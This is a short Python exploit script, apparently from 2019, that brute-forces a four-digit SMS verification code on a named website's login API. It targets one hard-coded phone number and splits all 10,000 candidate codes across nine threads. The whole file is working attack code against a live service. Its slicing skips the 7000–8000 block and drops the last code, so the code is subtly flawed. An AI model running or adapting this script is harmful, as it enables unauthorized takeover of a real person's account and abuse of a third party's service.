#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2019/3/13 21:03
# @Author  : liuwenchao
# @File    : wei_ku_exp.py
# @Software: PyCharm


import requests
import json
import threading

login_data = {
    'mode': 'code-login',
    'phone': '',
    'save_login': 1,
    'verify_code': ''
}

header = {
    'Content-Type': 'application/json'
}




def get_pwd(str, num):
    if (num == 1):
        for x in str:
            yield x
    else:
        for x in str:
            for y in get_pwd(str, num - 1):
                yield x + y


def get_verify_code(*x):
    for i in range(len(x)):
        login_data['phone'] = '13426004935'
        login_data['verify_code'] = x[i]
        response = requests.post(url='https://www.yojiang.cn/api/user/login', data=json.dumps(login_data),
                                 headers=header)
        if response.json()['success']:
            print('SUCCESS. Verify_code = %s' % x[i])
            return

if __name__ == '__main__':
    verify = '0123456789'
    arr = []
    for x in get_pwd(verify, 4):
        arr.append(x)
    thread1 = threading.Thread(target=get_verify_code, args=arr[0:1000])
    thread2 = threading.Thread(target=get_verify_code, args=arr[1000:2000])
    thread3 = threading.Thread(target=get_verify_code, args=arr[2000:3000])
    thread4 = threading.Thread(target=get_verify_code, args=arr[3000:4000])
    thread5 = threading.Thread(target=get_verify_code, args=arr[5000:6000])
    thread6 = threading.Thread(target=get_verify_code, args=arr[6000:7000])
    thread7 = threading.Thread(target=get_verify_code, args=arr[8000:9000])
    thread8 = threading.Thread(target=get_verify_code, args=arr[9000:9999])
    thread9 = threading.Thread(target=get_verify_code, args=arr[4000:5000])
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()
    thread6.start()
    thread7.start()
    thread8.start()
    thread9.start()

